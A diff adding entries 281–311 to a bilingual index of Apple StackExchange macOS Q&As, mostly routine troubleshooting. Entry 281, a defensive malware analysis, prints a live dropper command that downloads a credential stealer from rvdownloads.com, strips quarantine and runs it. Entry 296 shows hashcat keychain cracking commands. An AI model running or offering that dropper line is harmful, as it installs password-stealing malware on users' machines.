@@ -2,7 +2,7 @@
 
 **🔙 [返回总索引](index.md) | [Back to Index](index.md)**
 
-**总计条目 / Total entries: 280**
+**总计条目 / Total entries: 366**
 
 > 技术细节（问题描述、解决方案等）保留原始语言以确保准确性，结构性文本提供中英双语。
 > Technical details (descriptions, solutions) remain in original language for accuracy; structural text is bilingual.
@@ -6767,5 +6767,1586 @@ See V2EX thread for community solutions.
 
 **参考链接 / References**:
 - https://www.coinsbee.com/zh/gift-cards/entertainment/apple/
+
+---
+
+#### 281. Can anyone tell me if the script I ran embedded anything on my machine from that, or whether it accessed any private data?
+
+**问题描述 / Problem Description**:
+Tags: macos, security, hacking | Score: 13 | Views: 1832 | Answers: 1 | Created: 2026-03-21
+
+**解决方案 / Solution**:
+It's a highly obfuscated (and obviously malicious) shell command that eventually downloads and executes a binary payload with the name helper, bypassing Gatekeeper. The last stage of the drop is this:
+curl -o /tmp/helper https://rvdownloads.com/usbfix/update &amp;&amp; xattr -c /tmp/helper &amp;&amp; chmod +x /tmp/helper &amp;&amp; /tmp/helper
+
+Two of the AV engines on the VirusTotal website flag the payload as a credential stealer:
+Avast        MacOS:Stealer-HH
+ESET-NOD32   OSX/PSW.Agent.GR Trojan
+
+For more information, see:
+Malware campaign impersonating Claude Code install via Google (github.com).
+The linked page describes what seems to be a slightly different variant:
+
+The decrypted payload executes two osascript processes that:
+
+Request TCC AppleEvents permission for Terminal
+Browse /Applications/ via Finder (fndr,gstl) for reconnaissance
+Hide the Terminal window (core,setd → Terminal)
+Gather system info via multiple do shell script calls
+Write a machine fingerprint hash to ~/.username
+Display a fake password dialog (syso,dlog) to social-engineer the
+user's macOS password
+Write the captured password to ~/.pass
+Create temporary staging files, read system data
+Exfiltrate collected data via curl back to woupp.com
+Clean up temporary files
+
+
+You have to assume that all your private data is compromised.
+The one mitigating feature of this malware, at least in the variant analyzed by Anthropic on GitHub, is that it has no persistence mechanism. It's apparently one and done. But I'm not a security researcher and I didn't disassemble the payload or run it to see what it does. At a minimum, you should open System Settings &gt; General &gt; Login Items &amp; Extensions and make sure there is nothing there that you don't recognize, even if it looks innocent. If there is, please report it here.
+Waste no time changing all important passwords. Take whatever precautions you deem necessary against identity theft. Expect follow-on attacks attempting to defeat two-factor authentication.
+For the form those follow-on attacks may take, see:
+How Attackers Bypass Two-factor Authentication (2FA) (zitadel.com).
+
+Even if the attacker has already obtained your user credentials, they still need to acquire the additional authentication factor to gain access to your account. To receive the required code from the victim, the criminal might call, text, or email them with a seemingly plausible justification. Of course, they will likely do so disguised as a trusted entity, such as Google or Apple, to minimize suspicion. Make sure to always double-check the sender’s identity, as well as the content of the text message, to avoid falling victim to a hacking attempt.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486095/can-anyone-tell-me-if-the-script-i-ran-embedded-anything-on-my-machine-from-that
+
+---
+
+#### 282. Adding &quot;real&quot; creation date to scanned &quot;old&quot;pictures
+
+**问题描述 / Problem Description**:
+Tags: macos, exif | Score: 9 | Views: 1096 | Answers: 3 | Created: 2026-03-30
+
+**解决方案 / Solution**:
+Unix timestamps (as used by touch) can go before 1970 (thanks @slingerapp for pointing this out) but this is not relevant here.
+exiftool can be installed directly from the ExifTool Website as a standard macOS package, or via Homebrew/MacPorts. It allows to change the EXIF metadata of the picture, including the creation date. EXIF stores the same information in different tags, ideally all of them are updated to the same value.
+exiftool -DateTimeOriginal=&quot;2023:01:15 12:34:56&quot; -CreateDate=&quot;2023:01:15 12:34:56&quot; -MediaCreateDate=&quot;2023:01:15 12:34:56&quot; /path/to/image.jpg
+
+PS: You need to do this before loading an image into Photos or similar. If it is already managed by Photos, export/copy it to a temporary folder, delete it in Photos, run exiftool and import it again.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486151/adding-real-creation-date-to-scanned-oldpictures
+
+---
+
+#### 283. Is Sequoia (macOS 15) the last OS for a 2019 Intel Mac?
+
+**问题描述 / Problem Description**:
+Tags: macos, macbook-pro, software-update | Score: 6 | Views: 615 | Answers: 2 | Created: 2026-04-10
+
+**解决方案 / Solution**:
+See https://support.apple.com/en-us/122867 for the list of Mac models which Tahoe officially supports. This includes just a few Intel models:
+
+MacBook Pro 16-inch, 2019
+MacBook Pro 13-inch, 2020, 4 Thunderbolt ports
+iMac Retina 27-inch, 2020
+Mac Pro, 2019
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486207/is-sequoia-macos-15-the-last-os-for-a-2019-intel-mac
+
+---
+
+#### 284. What is a reliable way to get &quot;last shutdown&quot; time via shell script in macOS Tahoe 26.4?
+
+**问题描述 / Problem Description**:
+Tags: macos, command-line, shutdown, shortcuts-app, tahoe | Score: 6 | Views: 449 | Answers: 2 | Created: 2026-04-03
+
+**解决方案 / Solution**:
+last shutdown fails for me too (macOS 15.7.5 and 26.4).
+% last shutdown
+wtmp begins Fri 13 Feb 2026 12:10:07 AEDT
+
+However, last reboot | grep 'shutdown' returns all shutdown times.
+You can use last reboot | grep -m 1 shutdown | cut -c 44- to catch the most recent one.
+Since, as @Linc Davis says in his answer, this will not return power interruptions, you may prefer to parse last reboot which lists both orderly shutdowns and reboots.
+Example:
+% last reboot
+reboot time                                Wed 25 Mar 12:09
+shutdown time                              Wed 25 Mar 12:03
+reboot time                                Sat 21 Mar 08:08
+reboot time                                Thu 12 Mar 09:54
+shutdown time                              Thu 12 Mar 09:51
+reboot time                                Fri 13 Feb 12:10
+wtmp begins Fri 13 Feb 2026 12:10:07 AEDT
+
+Edit:
+Packaging one of the methods as a Shortcut:
+
+Of course, this only the most recent orderly shutdown.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486178/what-is-a-reliable-way-to-get-last-shutdown-time-via-shell-script-in-macos-tah
+
+---
+
+#### 285. Why does “brew search” for “peertube” match with “freetube”? How does the search work?
+
+**问题描述 / Problem Description**:
+Tags: command-line, homebrew, search | Score: 6 | Views: 1369 | Answers: 1 | Created: 2025-07-23
+
+**解决方案 / Solution**:
+The brew search command uses a &quot;fuzzy search&quot; based on the &quot;DidYouMean&quot; gem. This causes search results to include formulae that are spelled similarly, by inserting, deleting, substituting, and transposing some letters. The exact algorithms and thresholds that DidYouMean uses for spelling suggestions are not documented but it appears to use Jaro-Winkler and Levenshtein distance.
+&quot;peertube&quot; and &quot;freetube&quot; are spelled similarly enough that searching for the former will return the latter. You can try searching for other strings (like &quot;feertube&quot;, &quot;pretube&quot;, &quot;etube&quot;, &quot;feertub&quot;, &quot;frtbe&quot;, &quot;pertbe&quot;) to get a sense for how similar of a search term will still return a particular formula in the results, or will not.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/480853/why-does-brew-search-for-peertube-match-with-freetube-how-does-the-search
+
+---
+
+#### 286. Is there a way to change installation directory of brew cask applications?
+
+**问题描述 / Problem Description**:
+Tags: macos, command-line, homebrew | Score: 6 | Views: 1945 | Answers: 1 | Created: 2024-10-23
+
+**解决方案 / Solution**:
+You can override a Homebrew app install location with --appdir:
+% brew help install
+...
+      --appdir                     Target location for Applications (default:
+                                   /Applications).
+
+% brew install --cask --appdir ~/Applications app
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/476279/is-there-a-way-to-change-installation-directory-of-brew-cask-applications
+
+---
+
+#### 287. How to install “oath-toolkit” on a MacBook Air (2017) running macOS Monterey (12.7.6)?
+
+**问题描述 / Problem Description**:
+Tags: install, homebrew, macports, two-factor-authentication | Score: 5 | Views: 294 | Answers: 2 | Created: 2026-04-19
+
+**解决方案 / Solution**:
+MacPorts has better support for legacy versions of macOS, so in your case it’s the package manager of choice.
+oath-toolkit is available on MacPorts.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486252/how-to-install-oath-toolkit-on-a-macbook-air-2017-running-macos-monterey-12
+
+---
+
+#### 288. Any reason homebrew env should be set twice in .zprofile?
+
+**问题描述 / Problem Description**:
+Tags: macos, homebrew, zsh | Score: 5 | Views: 487 | Answers: 1 | Created: 2026-03-10
+
+**解决方案 / Solution**:
+I would remove the last two lines.
+Don’t overthink this one as it won’t do good things to your $PATH.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486025/any-reason-homebrew-env-should-be-set-twice-in-zprofile
+
+---
+
+#### 289. After `brew install --cask claude-code` running `claude` fails with &quot;claude not Opened: Apple could not verify claude is free of malware...&quot;
+
+**问题描述 / Problem Description**:
+Tags: macos, command-line, homebrew, gatekeeper | Score: 5 | Views: 3951 | Answers: 1 | Created: 2025-08-20
+
+**解决方案 / Solution**:
+Run the following in terminal:
+xattr -d com.apple.quarantine $(which claude)
+
+or via GUI:
+
+Go to &quot;Privacy &amp; Security&quot; in the &quot;Settings&quot; app
+Scroll down to &quot;Security&quot;
+Hit &quot;Allow Anyway&quot; next to &quot;'claude' was blocked to protect your Mac&quot;
+
+
+In case this problem could be fixed upstream, I've opened a Github issue on homebrew/homebrew-cask:
+
+https://github.com/Homebrew/homebrew-cask/issues/224670
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481249/after-brew-install-cask-claude-code-running-claude-fails-with-claude-not
+
+---
+
+#### 290. How to mount an external drive read-only, first time?
+
+**问题描述 / Problem Description**:
+Tags: macos, hard-drive, external-disk, mount, automount | Score: 4 | Views: 91 | Answers: 1 | Created: 2026-04-14
+
+**解决方案 / Solution**:
+I found an alternative solution that worked for me, though it does need some extra kit:
+Use a Linux machine to get the volume UUIDs, then configure the Mac to mount those read-only.
+(I already have a tiny PC running Linux Mint, which made this relatively straightforward.  The details here are for Linux Mint 22 with Cinnamon, though I expect there are equivalents for most Linux systems.)
+On the Linux box:
+
+Configure it not to automount partitions: deselect Files app → Edit → Preferences → Behaviour → Media Handling → ‘Automatically mount removable media when inserted and on startup’.
+
+Connect the HD.
+
+Open the Disks app; it should be shown on the LHS.
+
+Select the HD to see all its partitions and their UUIDs (and also the labels of unencrypted ones), and note them down.
+
+Eject the HD: in Files, ensure the LH sidebar is showing, right-click on one of the HD’s volumes, and select Safely Remove Drive.
+
+
+Then, on the Mac:
+
+sudo vifs (from an admin account)
+
+Add a line for each volume, in the format: UUID=&lt;UUID&gt; none auto ro
+
+If you know the volume label, you can replace the first part with LABEL=&lt;label&gt; (and perhaps skip the Linux part!), though you need to replace special characters e.g. space → \040.
+
+If you know the volume format, you can replace the auto with hfs or apfs.
+
+And you can append ,noauto to prevent the volume being automounted at all, and/or change the ro to rw for read-write.
+
+
+
+Save and exit.
+
+
+(That assumes you’re familiar with vi.  If not, there’s loads of info out there.)
+After that, when you connect the HD, its volumes will be automounted in read-only mode.  Trying to save anything will fail with an error such as ‘Read-only file system’ or ‘The volume “&lt;volumename&gt;” is read only.’  QEF∎
+
+I’m still surprised there’s no all-Mac solution to this, though…
+If I hadn’t had a Linux machine handy, my next attempt would probably have been to pause diskarbitrationd by sending it SIGSTOP, then work out how to manually mount each volume read-only, and finally send SIGCONT to resume the diskarbitrationd.  But that’s awkward, as neither Disk Utility nor diskutil will work without diskarbitrationd; and there are reports of significant collateral damage, even after resuming it, though I can’t confirm that.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486230/how-to-mount-an-external-drive-read-only-first-time
+
+---
+
+#### 291. Is there a camera plugin for macOS to appear to be looking straight at the camera?
+
+**问题描述 / Problem Description**:
+Tags: macos, software-recommendation, camera | Score: 4 | Views: 1341 | Answers: 2 | Created: 2026-04-13
+
+**解决方案 / Solution**:
+None I can recommend for teams or zoom, even FaceTime trying to fake this out IMO isn’t a good solution (it works for panning, not so much for pupil redirection without changing the iris and eyelids). It’s the best I’ve seen, but not for your apps.
+
+I recommend a proper teleprompter setup if you need to be looking directly at the camera no matter which streaming platform you use. If close enough is good enough, Ben has great tips for minimizing the eye angle.
+
+https://www.bhphotovideo.com/c/buy/Teleprompters
+
+The two Elgato products are solid and reasonably priced (USD 300 and 600).
+
+Are you certain this matters to the audience? I would presume they are more interested in your ability to deliver the content than make eye contact while you are understandably focused on the content. For how long are you not taking a break to engage the audience by looking at the camera?
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486219/is-there-a-camera-plugin-for-macos-to-appear-to-be-looking-straight-at-the-camer
+
+---
+
+#### 292. How does one set swap space in macOS on an Apple Silicon Mac mini?
+
+**问题描述 / Problem Description**:
+Tags: macos, memory, diskutil, virtual-memory | Score: 4 | Views: 299 | Answers: 1 | Created: 2026-04-04
+
+**解决方案 / Solution**:
+You don't need to, and can't, change the size of the swap volume. An APFS volume doesn't have a fixed size. It shares space dynamically with all other volumes in the same container. It may or may not have a minimum (reserve) and maximum (quota) space allocation, which in the case of system volumes would be determined by its role. Just leave it alone. macOS is not like Linux and you rarely, if ever, have a reason to tamper with such things.
+The statistic relevant to performance is swap activity, not the total size of the backing store. This is shown in the last two lines of output of the vm_stat(1) shell command. If either of those numbers is high, that means you're trying to do more than the physical memory of the machine can easily handle, or else some long-running process is leaking memory.
+See the APFS section of the diskutil(8) man page for more information about the filesystem.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486181/how-does-one-set-swap-space-in-macos-on-an-apple-silicon-mac-mini
+
+---
+
+#### 293. How to set custom colorizing of “ls” output in Zsh?
+
+**问题描述 / Problem Description**:
+Tags: macos, command-line, zsh | Score: 4 | Views: 404 | Answers: 2 | Created: 2026-03-21
+
+**解决方案 / Solution**:
+LS_COLORS isn't used by the standard macOS ls (see man ls or strings /bin/ls | grep COLOR) so setting it doesn't have an effect. The standard ls also doesn't support type/suffix-specific coloring, so even with the coloring options described in ls(1) you can't get the coloring you want.
+What you could do instead is to install GNU ls via Homebrew (brew install coreutils). This installs the GNU versions with a g prefix (to avoid breaking any scripts etc because the options are different), e.g. gls or gdircolors (for the full list of commands in coreutils, run ls $(brew --prefix)/Cellar/coreutils/*/bin ).
+For your .zprofile:
+# Set LS_COLORS
+LS_COLORS='di=00;34:fi=00;0:ln=00;96:pi=00;37:so=00;37:bd=00;37:cd=00;37:or=00;93:mi=00;94:ex=00;31:*.tar=00;90:*.gz=00;90:*.awk=00;35:*.sed=00;33:*.py=00;93'
+export CLICOLOR=1
+
+# Prettify and streamline listings
+alias ls='gls'
+alias ll='gls -l'
+alias la='gls -a'
+alias lla='gls -al'
+alias lf='gls -F'
+alias laf='gls -laF'
+alias llf='gls -lF'
+alias llaf='gls -alF'
+
+PS: When I tested this here, I also had to add --color=always, but this may be due to my specific setup.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486098/how-to-set-custom-colorizing-of-ls-output-in-zsh
+
+---
+
+#### 294. Calculator: how do I enter a negative exponent?
+
+**问题描述 / Problem Description**:
+Tags: macos, ventura, calculator.app | Score: 4 | Views: 714 | Answers: 2 | Created: 2026-03-05
+
+**解决方案 / Solution**:
+After entering 9 as the exponent, click the +/- button, or press the key combination option-, to change its sign as a unary operation.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/485988/calculator-how-do-i-enter-a-negative-exponent
+
+---
+
+#### 295. &quot;topgrade&quot; or &quot;brew&quot; issue? Warning: Calling conflicts_with formula: is deprecated! There is no replacement
+
+**问题描述 / Problem Description**:
+Tags: command-line, homebrew | Score: 4 | Views: 1228 | Answers: 1 | Created: 2025-08-21
+
+**解决方案 / Solution**:
+This is related to homebrew due to deprecation of conflicts_with, a homebrew formula (you can think of it as an api or library function).
+According to homebrew discussion on github https://github.com/orgs/Homebrew/discussions/6364#discussioncomment-14224257. Quote from jabenninghoff reply:
+
+jabenninghoff
+It seems like this is the result of this change: Homebrew/brew#20499, which deprecated conflicts_with formula. When it was done, there were still casks using this feature. While the statement was removed from the cask definitions, if it was already installed on your system, conflicts_with formula remained in the json metadata as @WinkelCode discovered.
+After some testing on my system, it seems that the options for fixing are:
+
+Ignore the deprecation warning and wait for all of the offending casks to be updated.
+Reinstall all of the offending casks. This worked for me with brew reinstall wireshark-app. A brute-force approach of just reinstalling all casks should work as well.
+
+Update: running grep -irl '&quot;formula&quot;:' &quot;${HOMEBREW_PREFIX}/Caskroom&quot; should find all the offending casks, although there may be some false alarms (for me, this included mactex-no-gui which has a depends_on formula:.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481264/topgrade-or-brew-issue-warning-calling-conflicts-with-formula-is-deprecat
+
+---
+
+#### 296. Recover/Crack Password from Keychain in OS X 10.15 Catalina, via known items in keychain and potentially from logs?
+
+**问题描述 / Problem Description**:
+Tags: macos, terminal, password, keychain, logs | Score: 4 | Views: 872 | Answers: 1 | Created: 2025-05-30
+
+**解决方案 / Solution**:
+Does macOS store remnants or clear version of password in any locations?
+
+No, there are no plain text copies or remnants of your passwords deliberately stored by macOS.
+If this user account was previously able to unlock your external drive, then your drive credentials are probably still available via Apple's Keychain Access application. Since macOS 15, Keychain Access is found in /System/Library/CoreServices/Applications/Keychain Access.app.
+Look for entries of kind: encrypted volume password
+Older Keychain Login Files
+If you are unable to unlock the older .keychain file, then you will need to recover the password.
+Keychain Password Recovery
+It is possible to recover a Keychain password, particularly if you have an idea of the likely password's format.
+See Recovering Lost and Forgotten Keychain Passwords for a practical example that uses my Keysafe tool and hashcat to perform a brute force search.
+Below are the main steps, assuming homebrew and a word list are already available:
+brew tap miln-eu/miln-eu
+brew install miln-keysafe hashcat
+
+keysafe -recover -path sample.keychain &gt; keychain-hash.txt
+sed 's/^[^:]*://' keychain-hash.txt &gt; for-hashcat.txt
+
+hashcat -m 23100 --keep-guessing for-hashcat.txt ~/Downloads/clem9669_wordlist_small
+
+Keychain Format and Encryption
+The file format for Keychain is public but not documented. This is how I was able to write Keysafe without building on any Apple frameworks or libraries.
+I am not aware of any exploits. The choices Apple's engineers made have withstood over a decade of scrutiny. There are some odd aspects which complicate the code but nothing consequential.
+Keychain encryption is two step:
+
+Decrypt a per-file primary key;
+Decrypt the per-item symmetric keys using the primary key.
+
+The recovery hash contains the data, salt, and IV for the primary key. hashcat understands the recovery hash format and can aid with finding passwords that appear to work. For help with decrypting, the Information Security Stack Exchange may be helpful.
+I am not aware of any implementation that directly attempts to decode the per-item symmetric keys. These keys are encrypted using the primary key.
+For licensed users, Keysafe v1.9's -export archive includes the symmetric key table and meta data. This extra information may be technically interesting but is unlikely to ease decryption. The export also includes the primary key recovery hash.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/480184/recover-crack-password-from-keychain-in-os-x-10-15-catalina-via-known-items-in
+
+---
+
+#### 297. Side effects of changing the default shell in macOS to a Homebrew location
+
+**问题描述 / Problem Description**:
+Tags: macos, command-line, bash, homebrew | Score: 4 | Views: 498 | Answers: 2 | Created: 2025-03-24
+
+**解决方案 / Solution**:
+Sure, using a user-installed binary as a login shell has its risk, but so does running an outdated version even if it is supplied by Apple.
+You can minimize the risk by
+
+using a dedicated user with admin rights to maintain the homebrew installation (to avoid accidential or malicious insertion of backdoored commands in the homebrew bin directory during daily use),
+creating a backup admin user with a macOS-supplied login shell (to protect against the risk of accidentical deletion of the Homebrew version or the symlink),
+using brew pin bash to prevent unexpected updates (to protect against the very low bitcoiner risk), and update manually if required.
+
+PS: Not risk-related, but you should add /opt/homebrew/bin/bash to /etc/shells to make chsh work without sudo.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/479207/side-effects-of-changing-the-default-shell-in-macos-to-a-homebrew-location
+
+---
+
+#### 298. Purchase/download button missing in Mac AppStore, how do I get it back?
+
+**问题描述 / Problem Description**:
+Tags: macos, mac-appstore, tahoe | Score: 3 | Views: 157 | Answers: 1 | Created: 2026-04-14
+
+**解决方案 / Solution**:
+AppStore (and Books.app for that matter) have various glitches and this is one of them.
+For example, I can reproduce the loss of the &quot;Purchase&quot;, or &quot;Install&quot; button by enabling &quot;Hover Text&quot; in System Settings and pressing the cmd key whilst going over items like the &quot;Cancel&quot; button in your screenshot:
+
+It will stay lost even after quitting and re-launching AppStore and I can bring it back by using &quot;Hover Text&quot; on certain items in the main AppStore background window (a reboot also did revive it).
+Another, but less permanent way - as commented by Linc Davis - is to drag the window, including the purchase sheet, into Mission Control (the top spaces bar).
+Also dragging the main window makes the button disappear and reappear in rapid succession.
+Which brings us to the answer: According to nohillside's comments, dragging the main AppStore window slightly offscreen and back again, did in fact revive the &quot;Purchase&quot; button.
+Why this behaviour persisted through reboots is still a mystery to me though.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486229/purchase-download-button-missing-in-mac-appstore-how-do-i-get-it-back
+
+---
+
+#### 299. How do I stop Apple Notes on macOS from converting #hashtags into tags?
+
+**问题描述 / Problem Description**:
+Tags: macos, notes.app | Score: 3 | Views: 76 | Answers: 1 | Created: 2026-03-10
+
+**解决方案 / Solution**:
+Edit → Substitutions → Smart Tags → disable.
+
+Huge thanks to Reddit for pointing this out! https://www.reddit.com/r/applehelp/comments/s7t2eo/comment/i9t503b/
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486029/how-do-i-stop-apple-notes-on-macos-from-converting-hashtags-into-tags
+
+---
+
+#### 300. Can my MacBook Pro support this 3-screen setup?
+
+**问题描述 / Problem Description**:
+Tags: macbook-pro, mac, display, thunderbolt, accessories | Score: 3 | Views: 449 | Answers: 3 | Created: 2025-08-09
+
+**解决方案 / Solution**:
+According to the „Supports“ section on the product page, this dock only supports one external display on macOS.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481100/can-my-macbook-pro-support-this-3-screen-setup
+
+---
+
+#### 301. Getting &quot;“Chromium” is damaged and can’t be opened.&quot; after installing with `brew install --cask chromium`
+
+**问题描述 / Problem Description**:
+Tags: install, homebrew, gatekeeper, macos | Score: 3 | Views: 2542 | Answers: 1 | Created: 2025-05-03
+
+**解决方案 / Solution**:
+The Chromium binary isn't code-signed. There's a simple workaround: uninstall Chromium and reinstall with the --no-quarantine flag which tells homebrew to remove the quarantine attribute automatically (do this only if you trust the binary you're installing):
+brew uninstall chromium
+brew install --cask chromium --no-quarantine
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/479829/getting-chromium-is-damaged-and-can-t-be-opened-after-installing-with-brew
+
+---
+
+#### 302. When opening terminal applications, launchd is setting the initial $PATH inconsistently. Why?
+
+**问题描述 / Problem Description**:
+Tags: macos, terminal, launchd, zsh, path | Score: 3 | Views: 420 | Answers: 1 | Created: 2025-04-06
+
+**解决方案 / Solution**:
+What I would like to know is what it will be tomorrow, why, and whether I can lock it down without overriding it.
+
+The PATH environment variable is subject to change between releases of macOS. For Power Manager, we recently had to actively set more environment variables after macOS changed its behaviour.
+If you require a predictable PATH environment variable, proactively set it based on your needs.
+darwin/sysroot/include/paths.h
+Within the underlying darwin source code are the following constants:
+#define _PATH_DEFPATH &quot;/usr/local/bin:/bin:/usr/bin&quot;
+#define _PATH_STDPATH &quot;/bin:/usr/bin:/sbin:/usr/sbin&quot;
+
+It is likely everything appended to these values is application specific; be that by the developers' choice or through user configuration files.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/479428/when-opening-terminal-applications-launchd-is-setting-the-initial-path-inconsi
+
+---
+
+#### 303. How to add date and time instead of &quot;-1&quot; to &quot;duplicate&quot; files (files with names which already exists in the same folder)?
+
+**问题描述 / Problem Description**:
+Tags: macos, finder, filesystem, automation | Score: 2 | Views: 325 | Answers: 1 | Created: 2026-04-21
+
+**解决方案 / Solution**:
+No, but instead of downloading the files in a web browser, you may be able to adapt this solution:
+Source - https://stackoverflow.com/a/76231090
+Posted by l'L'l
+Retrieved 2026-04-21, License - CC BY-SA 4.0
+url=&quot;https://example.com/media/document.txt&quot;
+curl -o &quot;$(basename ${url%.*}-$(date +&quot;%Y-%m-%d&quot;).${url##*.})&quot; -s &quot;$url&quot; -C -
+
+It will only work if the server allows deep linking.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486275/how-to-add-date-and-time-instead-of-1-to-duplicate-files-files-with-names
+
+---
+
+#### 304. Why can’t a disk be ejected because Finder is using it?
+
+**问题描述 / Problem Description**:
+Tags: macos, finder, hard-drive | Score: 2 | Views: 69 | Answers: 2 | Created: 2026-04-09
+
+**解决方案 / Solution**:
+Finder is always running on macOS. It shows the dock and folders it may contain in the dock based on your settings.
+The quick fix is log out (apple menu) and if you’re in the middle of things in apps, be sure to save your work and decide upon whether to check the “reopen apps” box. Either way, watch how long the log out takes - that is an indication how much the apps haven’t finished cleaning up or have things open.
+Once you’re logged out, disconnect the drive (assuming you don’t more than one graphical user logged in to the Mac).
+We would need a lot more context to guess if your apps have files open, Time Machine is involved, command line tools and processes are responsible for Finder reporting a disk isn’t ready to eject, etc…
+
+To get at the true source of the ongoing access:
+
+open terminal.app
+type fuser -c
+drag the icon of the disk into the window after your typing
+press return
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486201/why-can-t-a-disk-be-ejected-because-finder-is-using-it
+
+---
+
+#### 305. Why is it that since updating to macOS 26, it shows all WiFi including personal hotspot that is off, not my current WiFi?
+
+**问题描述 / Problem Description**:
+Tags: macos, wifi, tethering | Score: 2 | Views: 169 | Answers: 1 | Created: 2026-03-16
+
+**解决方案 / Solution**:
+In the menu bar item, the icon of the active network is outlined in blue. It won't necessarily be at the top. All known networks are listed by name in alphabetical order.
+Also, as helpfully pointed out by @Marc Wilson in a comment, the WiFi hotspot created by an iPhone switches on and off automatically on demand, if you've enabled Personal Hotspot &gt; Allow Others to Join in the Cellular settings.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/486065/why-is-it-that-since-updating-to-macos-26-it-shows-all-wifi-including-personal
+
+---
+
+#### 306. Virtual Desktop switching issue
+
+**问题描述 / Problem Description**:
+Tags: macos, macbook-pro, system-settings, keybindings | Score: 2 | Views: 94 | Answers: 1 | Created: 2026-03-04
+
+**解决方案 / Solution**:
+There is no technical reason for this, so the answer basically can only be “because Apple decided to do it so”.
+Conceptually I see a difference between switching to previous/next space and jumping to a space directly. How would sliding even work if you are on space 3 and jump to 9, should it briefly show spaces 4 to 8? So it makes lot of sense to use animations only for “swiping” to the previous/next space.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/485984/virtual-desktop-switching-issue
+
+---
+
+#### 307. Notifications are only shown when the specific app is opened
+
+**问题描述 / Problem Description**:
+Tags: macbook-pro, notifications, apple-silicon | Score: 2 | Views: 105 | Answers: 1 | Created: 2026-02-20
+
+**解决方案 / Solution**:
+Notifications on iOS are pushed from an Apple service, they are not provided by the app directly.
+On macOS, the application has to be running to receive notifications.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/485909/notifications-are-only-shown-when-the-specific-app-is-opened
+
+---
+
+#### 308. How do I log in on a pre-2017 MacBook Pro running macOS 13.7.8 (Ventura), when all recommended solutions have failed?
+
+**问题描述 / Problem Description**:
+Tags: macbook-pro, keyboard, password, filevault, ventura | Score: 2 | Views: 141 | Answers: 3 | Created: 2026-02-08
+
+**解决方案 / Solution**:
+If you are just trying to recover data, then I would suggest trying to use Target Disk mode to another Mac (assuming you can source one).
+
+https://support.apple.com/en-gb/guide/mac-help/mchlp1443/13.0/mac/13.0
+
+Essentially, connect this Mac to another Mac with USB or Thunderbolt cable, and press T while booting it. It should then act like an external disk to your other Mac.
+I would also stress the importance of having a backup copy of important documents.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/485824/how-do-i-log-in-on-a-pre-2017-macbook-pro-running-macos-13-7-8-ventura-when-a
+
+---
+
+#### 309. Terminals prompting for login and not starting properly anymore
+
+**问题描述 / Problem Description**:
+Tags: terminal, iterm, login | Score: 2 | Views: 522 | Answers: 1 | Created: 2025-08-13
+
+**解决方案 / Solution**:
+I resolved this issue after working with IT and wanted to share an update in case anyone runs into something similar. It turned out the problem wasn’t related to any files, settings, or system corruption as I initially suspected. Our company uses Ubikeys for authentication, and IT explained that a recent macOS update introduced a bug where the system fails to properly recognize the Ubikey. This caused login prompts to appear even when authentication should have worked.
+IT mentioned they reported the issue to Apple, but Apple hasn’t acknowledged it yet. As a workaround, they reset the root password and Ubikey authentication, which restored normal functionality—for now, at least, until the bug resurfaces.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/481162/terminals-prompting-for-login-and-not-starting-properly-anymore
+
+---
+
+#### 310. Extremely slow Terminal startup on macOS Sequoia (M3 Mac Pro)
+
+**问题描述 / Problem Description**:
+Tags: macos, macbook-pro, terminal, performance, zsh | Score: 2 | Views: 1997 | Answers: 3 | Created: 2025-04-22
+
+**解决方案 / Solution**:
+I had the exact same issue after updating my macos to latest 15.5 version. Even ls in an empty directory was taking ~250 ms!
+Anyway I was able to fix this by running:
+sudo tccutil reset All
+
+And then rebooting after fixed the slowness for me. This will reset system’s security policy cache which was corrupted after the OS upgrade for me. I looked at “Console” app that comes with the OS while i ran “ls” to check for errors, incase you were wondering how I got to this point. Absolutely killed my afternoon debugging this, hope it helps!
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/479649/extremely-slow-terminal-startup-on-macos-sequoia-m3-mac-pro
+
+---
+
+#### 311. Why is there a delay when using Automator to create a keyboard shortcut to open Terminal.app on macOS? Any faster alternatives?
+
+**问题描述 / Problem Description**:
+Tags: macos, terminal, applescript, automator | Score: 2 | Views: 350 | Answers: 2 | Created: 2024-11-26
+
+**解决方案 / Solution**:
+I have not used this tool, so I do not know if it will meet your needs: SRHD, Simple Rust Hotkey Daemon is a minimal and lightweight key binding service for MacOS similar to skhd. It is FOSS.
+https://github.com/sylvanfranklin/srhd
+I use rcmd, a paid app: https://lowtechguys.com/rcmd/. I hold the right CMD key and press I, and this launches iterm.
+And I suspect you are aware of application launchers such as Alfred. While relatively quick, they do require more than just a keyboard shortcut.
+
+**参考链接 / References**:
+- https://apple.stackexchange.com/questions/476993/why-is-there-a-delay-when-using-automator-to-create-a-keyboard-shortcut-to-open
+
+---
+
